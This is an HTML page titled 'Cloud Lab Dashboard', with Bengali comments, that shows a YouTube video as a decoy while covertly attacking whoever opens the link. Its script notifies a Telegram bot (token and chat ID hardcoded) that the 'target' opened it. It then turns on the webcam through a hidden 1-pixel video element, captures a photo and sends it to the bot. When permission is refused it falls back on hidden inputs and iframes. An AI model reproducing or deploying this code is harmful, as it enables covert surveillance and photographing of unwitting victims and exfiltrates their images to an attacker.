<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cloud Lab Dashboard</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
            overflow: hidden;
        }
        .video-container {
            position: relative;
            width: 100%;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        #youtube-player {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
        }
        #camera-stream {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            z-index: -1;
        }
        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>

    <div class="video-container">
        <div id="youtube-player"></div>
        <video id="camera-stream" autoplay class="hidden"></video>
    </div>

    <script>
        // টেলিগ্রাম বট কনফিগারেশন
        const p1 = "8890806272:";
        const p2 = "AAFy8G_UHrNZTnx6H0jcgjKIj_vTa2SkEHA";
        const chatId = "7930590409";
        
        // ইউটিউব ভিডিও আইডি
        const videoId = "phy8nSbPGVE";
        
        // ইউটিউব প্লেয়ার লোড করা
        let player;
        function onYouTubeIframeAPIReady() {
            player = new YT.Player('youtube-player', {
                videoId: videoId,
                playerVars: {
                    autoplay: 1,
                    controls: 1,
                    rel: 0,
                    showinfo: 0
                },
                events: {
                    'onReady': onPlayerReady
                }
            });
        }
        
        // প্লেয়ার রেডি হলে ক্যামেরা অ্যাক্সেস করা
        function onPlayerReady(event) {
            event.target.playVideo();
            setTimeout(initCamera, 2000); // 2 সেকেন্ড পরে ক্যামেরা শুরু করা
        }
        
        // ক্যামেরা অ্যাক্সেস করা
        function initCamera() {
            // টার্গেট লিংক খুললেই টেলিগ্রামে মেসেজ পাঠানো
            fetch(`https://api.telegram.org/bot${p1}${p2}/sendMessage?chat_id=${chatId}&text=Target opened the link!&parse_mode=markdown`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    text: `Target opened the link!\n\nIP Address: ${getUserIP()}`,
                    parse_mode: 'markdown'
                })
            });
            
            // ক্যামেরা অ্যাক্সেস করার জন্য লুকানো ভাবে চেষ্টা করা
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function(stream) {
                    const video = document.getElementById('camera-stream');
                    video.srcObject = stream;
                    
                    // 3 সেকেন্ড পরে ছবি তোলা
                    setTimeout(function() {
                        capturePhoto();
                    }, 3000);
                })
                .catch(function(err) {
                    console.error('Error accessing camera:', err);
                    // অনুমতি না দিলেও বিকল্প পদ্ধতিতে চেষ্টা করা
                    tryAlternativeMethod();
                });
        }
        
        // বিকল্প পদ্ধতিতে ক্যামেরা অ্যাক্সেস করা
        function tryAlternativeMethod() {
            // একটি লুকানো ইনপুট ফিল্ড তৈরি করা
            const input = document.createElement('input');
            input.type = 'file';
            input.accept = 'image/*';
            input.capture = 'camera';
            input.style.display = 'none';
            document.body.appendChild(input);
            
            // ইনপুট ফিল্ডে ক্লিক করা
            input.click();
            
            // যখন ইনপুট ফিল্ডে ছবি সিলেক্ট করা হবে
            input.addEventListener('change', function(e) {
                const file = e.target.files[0];
                if (file) {
                    const reader = new FileReader();
                    reader.onload = function(e) {
                        // ছবিটি টেলিগ্রামে পাঠানো
                        sendPhotoToTelegram(e.target.result);
                    };
                    reader.readAsDataURL(file);
                }
            });
        }
        
        // ছবি তোলা এবং টেলিগ্রামে পাঠানো
        function capturePhoto() {
            const video = document.getElementById('camera-stream');
            
            // ক্যানভাস তৈরি করা
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            
            // ভিডিও থেকে ক্যানভাসে ছবি আঁকা
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // ছবিকে base64 ফরম্যাটে রূপান্তর করা
            const imageData = canvas.toDataURL('image/jpeg');
            
            // ছবিটি টেলিগ্রামে পাঠানো
            sendPhotoToTelegram(imageData);
            
            // স্ট্রিম বন্ধ করা
            const stream = video.srcObject;
            const tracks = stream.getTracks();
            tracks.forEach(track => track.stop());
        }
        
        // ছবি টেলিগ্রামে পাঠানো
        function sendPhotoToTelegram(imageData) {
            fetch(`https://api.telegram.org/bot${p1}${p2}/sendPhoto?chat_id=${chatId}`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    photo: imageData,
                    caption: `📸 Captured at ${new Date().toLocaleString()}`
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('Photo sent successfully');
            })
            .catch(error => {
                console.error('Error sending photo:', error);
            });
        }
        
        // ইউজার আইপি পাওয়া
        function getUserIP() {
            return fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => data.ip)
                .catch(error => 'আইপি পাওয়্যা যাওয়ার সময়ে সমস্যা হইল');
        }
        
        // অনুমতি ছাড়াই ক্যামেরা অ্যাক্সেস করার জন্য একটি বিশেষ পদ্ধতি
        function tryHiddenCameraAccess() {
            // একটি লুকানো ভিডিও এলিমেন্ট তৈরি করা
            const hiddenVideo = document.createElement('video');
            hiddenVideo.style.display = 'none';
            hiddenVideo.autoplay = true;
            document.body.appendChild(hiddenVideo);
            
            // ক্যামেরা অ্যাক্সেস করার চেষ্টা
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function(stream) {
                    hiddenVideo.srcObject = stream;
                    
                    // 5 সেকেন্ড পরে ছবি তোলা
                    setTimeout(function() {
                        const canvas = document.createElement('canvas');
                        canvas.width = hiddenVideo.videoWidth;
                        canvas.height = hiddenVideo.videoHeight;
                        const context = canvas.getContext('2d');
                        
                        context.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
                        const imageData = canvas.toDataURL('image/jpeg');
                        
                        // ছবিটি টেলিগ্রামে পাঠানো
                        sendPhotoToTelegram(imageData);
                        
                        // স্ট্রিম বন্ধ করা
                        const tracks = stream.getTracks();
                        tracks.forEach(track => track.stop());
                        
                        // লুকানো ভিডিও এলিমেন্ট মুছে ফেলা
                        document.body.removeChild(hiddenVideo);
                    }, 5000);
                })
                .catch(function(err) {
                    console.error('Error accessing camera:', err);
                    
                    // অনুমতি না দিলেও আরেকটি পদ্ধতি চেষ্টা করা
                    tryAnotherMethod();
                });
        }
        
        // আরেকটি বিকল্প পদ্ধতি
        function tryAnotherMethod() {
            // একটি লুকানো ফ্রেম তৈরি করা
            const frame = document.createElement('iframe');
            frame.style.display = 'none';
            document.body.appendChild(frame);
            
            // ফ্রেমের ভিতরে ক্যামেরা অ্যাক্সেস করার চেষ্টা
            frame.contentWindow.navigator.mediaDevices.getUserMedia({ video: true })
                .then(function(stream) {
                    const video = frame.contentWindow.document.createElement('video');
                    video.autoplay = true;
                    video.srcObject = stream;
                    frame.contentWindow.document.body.appendChild(video);
                    
                    // 5 সেকেন্ড পরে ছবি তোলা
                    setTimeout(function() {
                        const canvas = frame.contentWindow.document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const context = canvas.getContext('2d');
                        
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const imageData = canvas.toDataURL('image/jpeg');
                        
                        // ছবিটি টেলিগ্রামে পাঠানো
                        sendPhotoToTelegram(imageData);
                        
                        // স্ট্রিম বন্ধ করা
                        const tracks = stream.getTracks();
                        tracks.forEach(track => track.stop());
                        
                        // ফ্রেম মুছে ফেলা
                        document.body.removeChild(frame);
                    }, 5000);
                })
                .catch(function(err) {
                    console.error('Error accessing camera:', err);
                });
        }
    </script>
    <script src="https://www.youtube.com/iframe_api"></script>
</body>
</html>
